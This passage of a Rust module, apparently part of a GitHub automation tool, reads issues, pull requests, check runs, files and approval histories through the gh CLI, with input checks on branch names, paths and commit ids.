//! Reads from GitHub: issues, comments, labels and pull requests.
//!
//! Each read runs `gh` through [`Tracker::gh`] and reads its answer, so the real `gh` and the
//! fake are read alike. Ported from the reading half of the runner's `src/tracker/github.ts`,
//! and from `src/tracker/approvalHistory.ts`, the pure half of the approval rule.

use serde::de::DeserializeOwned;

use super::gh::{invalid_argument, one_line, parse_error};
use super::{Tracker, TrackerError};
use crate::factory::lifecycle::approval::{Approval, TextCheck};
use crate::factory::lifecycle::{State, depends_on};
use crate::factory::text::is_commit_id;

// ---------------------------------------------------------------------------------------------
// Shared: running a read and decoding its answer.
// ---------------------------------------------------------------------------------------------

/// Runs a read and decodes its stdout as JSON of the shape `T`; serde's complaint joins
/// `expected`.
pub(crate) fn gh_json<T, G>(gh: &G, args: &[String], expected: &str) -> Result<T, TrackerError>
where
    T: DeserializeOwned,
    G: Tracker + ?Sized,
{
    let stdout = gh.gh(args)?;
    decode(args, expected, &stdout)
}

/// Decodes `text` as JSON of the shape `T`, or the parse error for the call with `args`.
pub(crate) fn decode<T: DeserializeOwned>(
    args: &[String],
    expected: &str,
    text: &str,
) -> Result<T, TrackerError> {
    serde_json::from_str(text).map_err(|error| {
        let why = error
            .to_string()
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
        parse_error(args, &format!("{expected} ({why})"))
    })
}

/// Runs `gh api --paginate` and collects the rows of every JSON array in stdout: gh prints
/// either one merged array or one array per page.
pub(crate) fn gh_pages<T, G>(
    gh: &G,
    args: &[String],
    expected: &str,
) -> Result<Vec<T>, TrackerError>
where
    T: DeserializeOwned,
    G: Tracker + ?Sized,
{
    let stdout = gh.gh(args)?;
    let pages = split_json_values(&stdout);
    if pages.is_empty() {
        return Err(parse_error(args, &format!("{expected} (output was empty)")));
    }
    let mut rows = Vec::new();
    for page in pages {
        rows.extend(decode::<Vec<T>>(args, expected, page)?);
    }
    Ok(rows)
}

fn is_json_space(c: u8) -> bool {
    matches!(c, b' ' | b'\n' | b'\r' | b'\t')
}

/// Splits text holding several top-level JSON values (`gh --paginate` prints one array per
/// page) into the text of each. Brackets and quotes inside strings do not count. A value that
/// is cut short comes back as is, for the decoder to refuse.
pub(crate) fn split_json_values(text: &str) -> Vec<&str> {
    let bytes = text.as_bytes();
    let mut values = Vec::new();
    let mut i = 0;
    loop {
        while i < bytes.len() && is_json_space(bytes[i]) {
            i += 1;
        }
        if i >= bytes.len() {
            return values;
        }
        let start = i;
        let mut depth = 0i64;
        let mut in_string = false;
        while i < bytes.len() {
            let c = bytes[i];
            if in_string {
                if c == b'\\' {
                    i += 1;
                } else if c == b'"' {
                    in_string = false;
                    if depth == 0 {
                        i += 1;
                        break;
                    }
                }
            } else if c == b'"' {
                in_string = true;
            } else if c == b'[' || c == b'{' {
                depth += 1;
            } else if c == b']' || c == b'}' {
                depth -= 1;
                if depth <= 0 {
                    i += 1;
                    break;
                }
            } else if depth == 0 && is_json_space(c) {
                break;
            }
            i += 1;
        }
        let end = i.min(bytes.len());
        // Every boundary above is an ASCII byte, so the slice is on character boundaries.
        values.push(&text[start..end]);
    }
}

/// The arguments of a GraphQL `query` about issue or pull request `number` of `repo`, or the
/// parse error for a repo not written as `owner/name`.
pub(crate) fn issue_query_args(
    repo: &str,
    query: &str,
    number: u64,
) -> Result<Vec<String>, TrackerError> {
    let Some((owner, name)) = repo.split_once('/') else {
        return Err(parse_error(
            &["api".into(), "graphql".into()],
            &format!("a repo written as owner/name, got `{repo}`"),
        ));
    };
    Ok(vec![
        "api".into(),
        "graphql".into(),
        "-f".into(),
        format!("query={query}"),
        "-f".into(),
        format!("owner={owner}"),
        "-f".into(),
        format!("name={name}"),
        "-F".into(),
        format!("number={number}"),
    ])
}

/// `text` quoted for an error message, on one line.
pub(crate) fn quoted(text: &str) -> String {
    format!("\"{}\"", one_line(text))
}

/// Whether `text` is GitHub's uniform UTC form `YYYY-MM-DDTHH:MM:SSZ`, so ordering the text
/// orders the times.
pub fn is_utc_second(text: &str) -> bool {
    let b = text.as_bytes();
    let digits = |range: std::ops::Range<usize>| b[range].iter().all(u8::is_ascii_digit);
    b.len() == 20
        && digits(0..4)
        && b[4] == b'-'
        && digits(5..7)
        && b[7] == b'-'
        && digits(8..10)
        && b[10] == b'T'
        && digits(11..13)
        && b[13] == b':'
        && digits(14..16)
        && b[16] == b':'
        && digits(17..19)
        && b[19] == b'Z'
}

/// Whether an account's login is an instructor's, in ASCII case. A deleted account (none)
/// never is.
pub fn is_instructor(login: Option<&str>, instructors: &[String]) -> bool {
    login.is_some_and(|login| {
        instructors
            .iter()
            .any(|name| name.eq_ignore_ascii_case(login))
    })
}

// ---------------------------------------------------------------------------------------------
// Part A: listings, one issue, blockers, pull requests, checks, branches and files.
// ---------------------------------------------------------------------------------------------

/// How many issues one listing of a label reads; past this the oldest are left out.
pub const LIST_LIMIT: usize = 200;

/// The most a file read through the contents API may be. A project config is a few lines.
pub const MAX_FILE_BYTES: u64 = 64 * 1024;

/// The most issues a `## Depends on` section may name. Each costs a `gh` call on every check,
/// so a longer list is refused rather than read.
pub const MAX_DEPENDS_ON: usize = 100;

/// An open issue in a listing.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct IssueSummary {
    pub number: u64,
    pub title: String,
    pub assignees: Vec<String>,
    /// The label names.
    pub labels: Vec<String>,
}

/// `cut` is set when the listing had more than [`LIST_LIMIT`] items.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Listing<T> {
    pub items: Vec<T>,
    pub cut: bool,
}

/// One issue as `gh issue view` reads it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct IssueDetail {
    pub number: u64,
    pub title: String,
    /// Empty for an issue with no description.
    pub body: String,
    pub labels: Vec<String>,
    pub assignees: Vec<String>,
    /// The author's login; `None` when GitHub gives none (a deleted account).
    pub author: Option<String>,
    /// The state of the one `factory:*` label; `None` for none, several or an unknown one.
    pub state: Option<State>,
    /// GitHub has the issue closed.
    pub closed: bool,
}

/// An open issue that blocks another one.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Blocker {
    /// `owner/name` of the repo the blocking issue is in.
    pub repo: String,
    pub number: u64,
}

/// Whether GitHub can merge a pull request into its base. GitHub computes it lazily: the read
/// that answers `Unknown` starts the computation, and a later read usually has the answer.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Mergeable {
    Mergeable,
    Conflicting,
    Unknown,
}

/// One pull request, as `gh pr view` reads it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PullRequest {
    pub number: u64,
    pub is_draft: bool,
    /// Neither merged nor closed.
    pub open: bool,
    /// Merged into its base.
    pub merged: bool,
    /// The branch the pull request comes from.
    pub head_ref: String,
    /// The head is in a fork, not in this repo.
    pub cross_repository: bool,
    /// The branch the pull request merges into.
    pub base_ref: String,
    /// The commit the head branch points at, as GitHub reports it.
    pub head_sha: String,
    pub mergeable: Mergeable,
    /// When it was opened, as GitHub writes it: `YYYY-MM-DDTHH:MM:SSZ`.
    pub created_at: String,
}

/// An open pull request as a listing gives it. Forks and other bases are listed too: the
/// caller decides which is the factory's own.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct OpenPullRequest {
    pub number: u64,
    pub url: String,
    pub head_ref: String,
    pub base_ref: String,
    pub cross_repository: bool,
    /// The login that opened it; `None` when GitHub names none.
    pub author: Option<String>,
}

/// How one required check stands on a commit: `Passed` when every run completed as `success`
/// or `neutral`, `Failed` when one completed as anything else, `Pending` when a run has not
/// completed, and `Missing` when no run of that name has a result.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CheckState {
    Passed,
    Failed,
    Pending,
    Missing,
}

/// One required check as read for a commit.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CheckStatus {
    /// The name that was asked for.
    pub name: String,
    pub state: CheckState,
    /// What GitHub says about the run that decided `state`: its conclusion when it completed,
    /// its status when it did not, and empty for a check with no run at all.
    pub conclusion: String,
    /// The run's page on GitHub, when it has one.
    pub url: Option<String>,
}

/// The fields `open_pull_requests_on_head` asks `gh pr list` for.
const PR_LIST_FIELDS: &str = "number,url,headRefName,baseRefName,isCrossRepository,author";

#[derive(serde::Deserialize)]
struct RawLogin {
    login: String,
}

#[derive(serde::Deserialize)]
struct RawLabel {
    name: String,
}

#[derive(serde::Deserialize)]
struct RawIssueSummary {
    number: u64,
    title: String,
    assignees: Vec<RawLogin>,
    labels: Vec<RawLabel>,
}

#[derive(serde::Deserialize, PartialEq, Eq)]
#[serde(rename_all = "UPPERCASE")]
enum IssueState {
    Open,
    Closed,
}

#[derive(serde::Deserialize)]
struct RawIssueView {
    number: u64,
    title: String,
    #[serde(default)]
    body: Option<String>,
    labels: Vec<RawLabel>,
    assignees: Vec<RawLogin>,
    state: IssueState,
    #[serde(default)]
    author: Option<RawLogin>,
}

#[derive(serde::Deserialize)]
struct RawBlocker {
    number: u64,
    state: String,
    #[serde(default)]
    repository_url: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawIssueBody {
    #[serde(default)]
    body: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawRestState {
    state: String,
}

#[derive(serde::Deserialize)]
struct RawRepoView {
    #[serde(default)]
    default_branch: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawRefObject {
    sha: String,
    #[serde(rename = "type")]
    kind: String,
}

#[derive(serde::Deserialize)]
struct RawRefView {
    object: RawRefObject,
}

#[derive(serde::Deserialize)]
struct RawPullRequest {
    number: u64,
    #[serde(rename = "isDraft")]
    is_draft: bool,
    state: String,
    #[serde(rename = "headRefName")]
    head_ref_name: String,
    #[serde(rename = "isCrossRepository")]
    is_cross_repository: bool,
    #[serde(rename = "baseRefName")]
    base_ref_name: String,
    #[serde(rename = "headRefOid")]
    head_ref_oid: String,
    mergeable: String,
    #[serde(rename = "createdAt")]
    created_at: String,
}

#[derive(serde::Deserialize)]
struct RawListedAuthor {
    login: String,
    /// `__typename` comes from GraphQL alone: `gh pr list` already writes a bot as `app/<slug>`.
    #[serde(rename = "__typename", default)]
    typename: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawListedPullRequest {
    number: u64,
    url: String,
    #[serde(rename = "headRefName")]
    head_ref_name: String,
    #[serde(rename = "baseRefName")]
    base_ref_name: String,
    #[serde(rename = "isCrossRepository")]
    is_cross_repository: bool,
    #[serde(default)]
    author: Option<RawListedAuthor>,
}

#[derive(serde::Deserialize)]
struct RawCheckRun {
    name: String,
    status: String,
    #[serde(default)]
    conclusion: Option<String>,
    #[serde(default)]
    html_url: Option<String>,
}

#[derive(serde::Deserialize)]
struct RawFileView {
    #[serde(rename = "type")]
    kind: String,
    #[serde(default)]
    encoding: Option<String>,
    size: u64,
    #[serde(default)]
    content: Option<String>,
}

/// Failed beats pending beats missing beats passed: a check passes only when every run passed.
fn check_rank(state: CheckState) -> u8 {
    match state {
        CheckState::Failed => 3,
        CheckState::Pending => 2,
        CheckState::Missing => 1,
        CheckState::Passed => 0,
    }
}

/// The state one check run decides, and the word GitHub gave for it.
fn check_outcome(status: &str, conclusion: Option<&str>) -> (CheckState, String) {
    if status != "completed" {
        return (CheckState::Pending, status.to_string());
    }
    match conclusion {
        Some(word @ ("success" | "neutral")) => (CheckState::Passed, word.to_string()),
        // Nothing ran. The factory's pull request is a draft until the checks pass, and a job
        // guarded by "not a draft" is skipped on it.
        Some("skipped") => (CheckState::Missing, "skipped".to_string()),
        other => (CheckState::Failed, other.unwrap_or("completed").to_string()),
    }
}

/// Standard base64 as GitHub's contents API writes it: wrapped with newlines, padded with `=`.
/// `None` for anything else, including data after padding and padding that does not fit the
/// length.
fn decode_base64(text: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    let mut bits: u32 = 0;
    let mut have: u32 = 0;
    let mut padding = 0;
    for c in text.chars() {
        let value = match c {
            'A'..='Z' => c as u32 - 'A' as u32,
            'a'..='z' => c as u32 - 'a' as u32 + 26,
            '0'..='9' => c as u32 - '0' as u32 + 52,
            '+' => 62,
            '/' => 63,
            '=' => {
                padding += 1;
                continue;
            }
            '\n' | '\r' => continue,
            _ => return None,
        };
        // Nothing may follow padding.
        if padding > 0 {
            return None;
        }
        bits = (bits << 6) | value;
        have += 6;
        if have >= 8 {
            have -= 8;
            out.push(((bits >> have) & 0xff) as u8);
            bits &= (1 << have) - 1;
        }
    }
    // What is left over is padding bits, which must be zero, and the padding must fit.
    let fits =
        (have == 0 && padding == 0) || (have == 4 && padding == 2) || (have == 2 && padding == 1);
    (fits && bits == 0).then_some(out)
}

/// A branch name as a path under `refs/heads/` in the API; `None` for a name that could leave
/// it.
fn encode_branch(branch: &str) -> Option<String> {
    if !is_branch_path(branch) {
        return None;
    }
    let mut out = String::new();
    for byte in branch.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.' | b'_' | b'~' | b'/') {
            out.push(byte as char);
        } else {
            out.push_str(&format!("%{byte:02X}"));
        }
    }
    Some(out)
}

fn is_plain_segment(part: &str) -> bool {
    part != "."
        && part != ".."
        && !part.is_empty()
        && part
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
}

/// The open issues with `state`'s label.
pub fn list_issues<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    state: State,
) -> Result<Listing<IssueSummary>, TrackerError> {
    let args = vec![
        "issue".to_string(),
        "list".into(),
        "--repo".into(),
        repo.into(),
        "--state".into(),
        "open".into(),
        "--label".into(),
        state.label().into(),
        "--limit".into(),
        (LIST_LIMIT + 1).to_string(),
        "--json".into(),
        "number,title,assignees,labels".into(),
    ];
    let raw: Vec<RawIssueSummary> = gh_json(gh, &args, "a JSON array of issues")?;
    let cut = raw.len() > LIST_LIMIT;
    let items = raw
        .into_iter()
        .take(LIST_LIMIT)
        .map(|item| IssueSummary {
            number: item.number,
            title: item.title,
            assignees: item.assignees.into_iter().map(|a| a.login).collect(),
            labels: item.labels.into_iter().map(|l| l.name).collect(),
        })
        .collect();
    Ok(Listing { items, cut })
}

/// One issue with its labels, assignees, body, author and state.
pub fn issue<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    number: u64,
) -> Result<IssueDetail, TrackerError> {
    let args = vec![
        "issue".to_string(),
        "view".into(),
        number.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "number,title,body,labels,assignees,state,author".into(),
    ];
    let raw: RawIssueView = gh_json(gh, &args, "an object describing an issue")?;
    let labels: Vec<String> = raw.labels.into_iter().map(|l| l.name).collect();
    let factory: Vec<&String> = labels
        .iter()
        .filter(|name| name.starts_with("factory:"))
        .collect();
    let state = match factory.as_slice() {
        [one] => State::from_label(one),
        _ => None,
    };
    Ok(IssueDetail {
        number: raw.number,
        title: raw.title,
        body: raw.body.unwrap_or_default(),
        assignees: raw.assignees.into_iter().map(|a| a.login).collect(),
        author: raw.author.map(|a| a.login),
        state,
        closed: raw.state == IssueState::Closed,
        labels,
    })
}

/// The open issues GitHub's dependency links say block `issue`.
pub fn open_blockers<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
) -> Result<Vec<Blocker>, TrackerError> {
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/issues/{issue}/dependencies/blocked_by"),
        "--paginate".into(),
    ];
    let listed: Vec<RawBlocker> = gh_pages(gh, &args, "JSON arrays of issues")?;
    let mut open = Vec::new();
    for raw in listed.into_iter().filter(|row| row.state != "closed") {
        // The blocker's repo is named in `repository_url`. Without it the caller would have to
        // guess, so the answer is an error and the issue is not claimed.
        let url = raw.repository_url.unwrap_or_default();
        let named = url
            .find("/repos/")
            .map(|cut| &url[cut + "/repos/".len()..])
            .unwrap_or("");
        let parts: Vec<&str> = named.split('/').collect();
        if parts.len() != 2 || parts[0].is_empty() || parts[1].is_empty() {
            return Err(parse_error(
                &args,
                &format!(
                    "issues that each name their repo in repository_url (#{} did not)",
                    raw.number
                ),
            ));
        }
        open.push(Blocker {
            repo: named.to_string(),
            number: raw.number,
        });
    }
    Ok(open)
}

/// The issues the body's `## Depends on` section names that are not closed.
pub fn text_blockers<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    issue: u64,
) -> Result<Vec<Blocker>, TrackerError> {
    let body_args = vec![
        "issue".to_string(),
        "view".into(),
        issue.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "body".into(),
    ];
    let raw: RawIssueBody = gh_json(gh, &body_args, "an object with the issue's body")?;
    let named = depends_on::blockers(raw.body.as_deref().unwrap_or(""));
    if named.len() > MAX_DEPENDS_ON {
        return Err(parse_error(
            &body_args,
            &format!(
                "a Depends on section naming at most {MAX_DEPENDS_ON} issues, got {}",
                named.len()
            ),
        ));
    }
    let mut open = Vec::new();
    for reference in named {
        let named_repo = reference.repo.unwrap_or_else(|| repo.to_string());
        let args = vec![
            "api".to_string(),
            format!("repos/{named_repo}/issues/{}", reference.number),
        ];
        let read: RawRestState = gh_json(gh, &args, "an object with the issue's state")?;
        if read.state != "closed" {
            open.push(Blocker {
                repo: named_repo,
                number: reference.number,
            });
        }
    }
    Ok(open)
}

/// The pull request; `None` for a number the repo does not have.
pub fn pull_request<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    number: u64,
) -> Result<Option<PullRequest>, TrackerError> {
    let args = vec![
        "pr".to_string(),
        "view".into(),
        number.to_string(),
        "--repo".into(),
        repo.into(),
        "--json".into(),
        "number,isDraft,state,headRefName,isCrossRepository,baseRefName,headRefOid,mergeable,createdAt"
            .into(),
    ];
    let stdout = match gh.gh(&args) {
        Ok(stdout) => stdout,
        Err(error @ (TrackerError::Other(_) | TrackerError::NotFound { .. }))
            if error
                .to_string()
                .to_lowercase()
                .contains("could not resolve to a pullrequest") =>
        {
            return Ok(None);
        }
        Err(error) => return Err(error),
    };
    let raw: RawPullRequest = decode(&args, "an object describing a pull request", &stdout)?;
    if !is_commit_id(&raw.head_ref_oid) {
        return Err(parse_error(
            &args,
            "a pull request and its full head commit id",
        ));
    }
    if !is_utc_second(&raw.created_at) {
        return Err(parse_error(
            &args,
            "a pull request's creation time as YYYY-MM-DDTHH:MM:SSZ",
        ));
    }
    Ok(Some(PullRequest {
        number: raw.number,
        is_draft: raw.is_draft,
        open: raw.state == "OPEN",
        merged: raw.state == "MERGED",
        head_ref: raw.head_ref_name,
        cross_repository: raw.is_cross_repository,
        base_ref: raw.base_ref_name,
        head_sha: raw.head_ref_oid,
        mergeable: match raw.mergeable.as_str() {
            "MERGEABLE" => Mergeable::Mergeable,
            "CONFLICTING" => Mergeable::Conflicting,
            _ => Mergeable::Unknown,
        },
        created_at: raw.created_at,
    }))
}

/// The open pull requests from a branch named `head`, forks included.
pub fn open_pull_requests_on_head<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    head: &str,
) -> Result<Vec<OpenPullRequest>, TrackerError> {
    if !is_plain_ref_name(head) {
        return Err(invalid_argument(head, "a plain branch name"));
    }
    let args = vec![
        "pr".to_string(),
        "list".into(),
        "--repo".into(),
        repo.into(),
        "--state".into(),
        "open".into(),
        "--head".into(),
        head.into(),
        "--limit".into(),
        "100".into(),
        "--json".into(),
        PR_LIST_FIELDS.into(),
    ];
    let rows: Vec<RawListedPullRequest> = gh_json(gh, &args, "a JSON array of pull requests")?;
    Ok(rows
        .into_iter()
        .map(|node| OpenPullRequest {
            number: node.number,
            url: node.url,
            head_ref: node.head_ref_name,
            base_ref: node.base_ref_name,
            cross_repository: node.is_cross_repository,
            author: match node.author {
                Some(author) if !author.login.is_empty() => {
                    if author.typename.as_deref() == Some("Bot") {
                        Some(format!("app/{}", author.login))
                    } else {
                        Some(author.login)
                    }
                }
                _ => None,
            },
        })
        .collect())
}

/// How each check in `names` stands on the commit `sha`.
pub fn checks<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    sha: &str,
    names: &[String],
) -> Result<Vec<CheckStatus>, TrackerError> {
    if !is_commit_id(sha) {
        return Err(invalid_argument(sha, "a full commit id"));
    }
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/commits/{sha}/check-runs?per_page=100&filter=latest"),
        "--paginate".into(),
        "--jq".into(),
        "[.check_runs[] | {name, status, conclusion, html_url}]".into(),
    ];
    let runs: Vec<RawCheckRun> = gh_pages(gh, &args, "JSON arrays of check runs")?;
    Ok(names
        .iter()
        .map(|name| {
            let mut found: Option<CheckStatus> = None;
            for run in runs.iter().filter(|run| &run.name == name) {
                let (state, conclusion) = check_outcome(&run.status, run.conclusion.as_deref());
                if found
                    .as_ref()
                    .is_none_or(|f| check_rank(state) > check_rank(f.state))
                {
                    // A link that does not point at GitHub is not passed on.
                    let url = run
                        .html_url
                        .as_ref()
                        .filter(|url| url.starts_with("https://github.com/"))
                        .cloned();
                    found = Some(CheckStatus {
                        name: name.clone(),
                        state,
                        conclusion,
                        url,
                    });
                }
            }
            found.unwrap_or_else(|| CheckStatus {
                name: name.clone(),
                state: CheckState::Missing,
                conclusion: String::new(),
                url: None,
            })
        })
        .collect())
}

/// The repo's default branch.
pub fn default_branch<G: Tracker + ?Sized>(gh: &G, repo: &str) -> Result<String, TrackerError> {
    let args = vec!["api".to_string(), format!("repos/{repo}")];
    let view: RawRepoView = gh_json(gh, &args, "an object with the repo's default branch")?;
    match view.default_branch {
        Some(branch) if !branch.is_empty() => Ok(branch),
        _ => Err(parse_error(
            &args,
            "an object with the repo's default branch (it had none)",
        )),
    }
}

/// The full commit id at the tip of `branch`.
pub fn branch_tip<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    branch: &str,
) -> Result<String, TrackerError> {
    let Some(encoded) = encode_branch(branch) else {
        return Err(invalid_argument(
            branch,
            "a branch name without empty or dot segments",
        ));
    };
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/git/ref/heads/{encoded}"),
    ];
    let view: RawRefView = gh_json(gh, &args, "an object with the commit the ref points at")?;
    if view.object.kind != "commit" || !is_commit_id(&view.object.sha) {
        return Err(parse_error(
            &args,
            "a commit and its full 40 or 64 digit id",
        ));
    }
    Ok(view.object.sha)
}

/// The text of the file at `path` in the commit `sha`.
pub fn file_at<G: Tracker + ?Sized>(
    gh: &G,
    repo: &str,
    path: &str,
    sha: &str,
) -> Result<String, TrackerError> {
    if !path.split('/').all(is_plain_segment) {
        return Err(invalid_argument(path, "a plain file path"));
    }
    if !is_commit_id(sha) {
        return Err(invalid_argument(sha, "a full commit id"));
    }
    let args = vec![
        "api".to_string(),
        format!("repos/{repo}/contents/{path}?ref={sha}"),
    ];
    let file: RawFileView = gh_json(gh, &args, "an object describing a file")?;
    let bad = |why: &str| parse_error(&args, &format!("a regular file read whole ({why})"));
    if file.kind != "file" {
        return Err(bad("it is not a regular file"));
    }
    if file.size > MAX_FILE_BYTES {
        return Err(bad("it is too big"));
    }
    if file.encoding.as_deref() != Some("base64") {
        return Err(bad("its content did not come as base64"));
    }
    let Some(bytes) = decode_base64(file.content.as_deref().unwrap_or("")) else {
        return Err(bad("its content is not valid base64"));
    };
    if bytes.len() as u64 != file.size {
        return Err(bad("its content is not as long as its size says"));
    }
    String::from_utf8(bytes).map_err(|_| bad("it is not UTF-8"))
}

/// Whether `branch` can be a path under `refs/heads/` in the API: no empty or dot segment.
/// Whether `branch` can be a path under `refs/heads/` in the API: no empty or dot segment.
/// `branch_tip` refuses any other name; a caller that wants its own words for the refusal
/// asks this first.
pub fn is_branch_path(branch: &str) -> bool {
    !branch
        .split('/')
        .any(|part| part.is_empty() || part == "." || part == "..")
}

/// Whether `name` can go into a ref the factory passes to git.
/// Whether `name` can go into a ref the factory passes to git: not empty, not an option, no
/// whitespace or control character, no `..`.
pub fn is_plain_ref_name(name: &str) -> bool {
    !name.is_empty()
        && !name.starts_with('-')
        && !name.contains("..")
        && !name.chars().any(|c| c.is_whitespace() || c.is_control())
}

/// Whether `branch` is only the characters of an ordinary branch name.
/// Whether `branch` can be written into a command a session runs (`git push origin
/// HEAD:<branch>` in a launch message): only the characters of an ordinary branch name, not an
/// option, no `..`. Stricter than [`is_plain_ref_name`], which only keeps a name safe as one
/// argument to git.
pub fn is_safe_branch_name(branch: &str) -> bool {
    !branch.is_empty()
        && branch
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'.' | b'_' | b'-'))
        && !branch.starts_with('-')
        && !branch.contains("..")
}

// ---------------------------------------------------------------------------------------------
// End of part A.
// ---------------------------------------------------------------------------------------------

// ---------------------------------------------------------------------------------------------
// Part B: approval history, issue activity and pull request feedback.
// ---------------------------------------------------------------------------------------------

use crate::factory::lifecycle::approval::Refusal;

/// How many label events and body edits the approval query asks for. A history this long may be
/// cut off.
pub const HISTORY_PAGE: usize = 100;

/// Any comment containing this was written by the factory.
const MARKER_PREFIX: &str = "<!-- softfac";

/// Who applied the issue's labels, who renamed it and who edited its body. `last: 100` of the
/// timeline items is the newest 100 (GitHub lists them oldest first), and
/// `userContentEdits(first: 100)` is the newest 100 edits (it lists newest first). Titles are
/// not asked for. `__typename` on an actor tells a person from a GitHub App.
pub const APPROVAL_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!) { ",
    "repository(owner: $owner, name: $name) { issue(number: $number) { ",
    "timelineItems(itemTypes: [LABELED_EVENT, UNLABELED_EVENT, RENAMED_TITLE_EVENT], last: 100) { ",
    "totalCount nodes { ",
    "__typename ",
    "... on LabeledEvent { createdAt actor { __typename login } label { name } } ",
    "... on UnlabeledEvent { createdAt actor { __typename login } label { name } } ",
    "... on RenamedTitleEvent { createdAt actor { __typename login } } } } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }",
);

/// The issue's body and who edited it last, with the history of its edits (newest first).
/// Comments are read separately, from REST.
pub const ACTIVITY_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!) { ",
    "repository(owner: $owner, name: $name) { issue(number: $number) { ",
    "body lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }",
);

/// Who edited comments, by node id, up to 100 ids in one call: the last editor and the last 100
/// edits of each. `Comment` is the interface that an issue comment implements. REST names only
/// the author, and anyone with write access can edit another person's comment. An id of a
/// comment that is gone answers `null`.
pub const COMMENT_EDITOR_QUERY: &str = concat!(
    "query($ids: [ID!]!) { nodes(ids: $ids) { ",
    "... on Comment { id lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }",
);

/// How many ids one [`COMMENT_EDITOR_QUERY`] call carries: the most `nodes` accepts.
const COMMENT_EDITOR_IDS: usize = 100;

/// The most pages of 50 reviews one feedback read takes: the newest and up to 19 earlier (20
/// points). 1,000 reviews is far past the factory's scale, so going on is GitHub misbehaving
/// and must not hold the pass open. A read pages back only to the last read that found nothing
/// new, so the limit is hit only by over 1,000 reviews between two such reads, and then every
/// read fails.
pub const REVIEW_PAGE_LIMIT: usize = 20;

/// The newest 50 reviews with the first 50 diff comments each, and the newest 100 conversation
/// comments. `pageInfo { startCursor }` lets `pr_feedback` page back ([`REVIEWS_BEFORE_QUERY`]).
/// `userContentEdits(first: 20)` keeps the nested query within GitHub's node limit; a longer
/// history is cut off and untrusted. Inline editors: [`COMMENT_EDITOR_QUERY`]. Priced at 2
/// points.
pub const PR_FEEDBACK_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!) { ",
    "repository(owner: $owner, name: $name) { pullRequest(number: $number) { ",
    "reviews(last: 50) { totalCount pageInfo { startCursor } nodes { ",
    "fullDatabaseId state body submittedAt author { __typename login } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } ",
    "comments(first: 50) { totalCount nodes { id body path line originalLine author { __typename login } ",
    "lastEditedAt } } } } ",
    "comments(last: 100) { nodes { ",
    "fullDatabaseId body createdAt author { __typename login } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } } } } } }",
);

/// The 50 reviews before the cursor `$before`, oldest first: the page [`PR_FEEDBACK_QUERY`] cut
/// off. The review fields are the same as there, and cost the same (1 point).
pub const REVIEWS_BEFORE_QUERY: &str = concat!(
    "query($owner: String!, $name: String!, $number: Int!, $before: String!) { ",
    "repository(owner: $owner, name: $name) { pullRequest(number: $number) { ",
    "reviews(last: 50, before: $before) { totalCount pageInfo { startCursor } nodes { ",
    "fullDatabaseId state body submittedAt author { __typename login } ",
    "lastEditedAt editor { __typename login } ",
    "userContentEdits(first: 20) { totalCount nodes { editedAt editor { __typename login } } } ",
    "comments(first: 50) { totalCount nodes { id body path line originalLine author { __typename login } ",
    "lastEditedAt } } } } } } }",
);

/// Who did something. `typename` is only there when the query asked for it; a rule that wants
/// a person needs a `User`.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
pub struct Actor {
    #[serde(rename = "__typename", default)]
    pub typename: Option<String>,
    pub login: String,
}

/// One entry of an edit history: when, and by whom (`None`: a deleted account).
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EditEntry {
    pub edited_at: String,
    #[serde(default)]
    pub editor: Option<Actor>,
}

/// An edit history, newest first, with GitHub's count of all of it.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EditHistory {
    pub total_count: u64,
    pub nodes: Vec<EditEntry>,
}

#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
pub struct LabelName {
    pub name: String,
}

/// A label applied or removed.
#[derive(Clone, Debug, PartialEq, Eq, serde::Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct LabelChange {
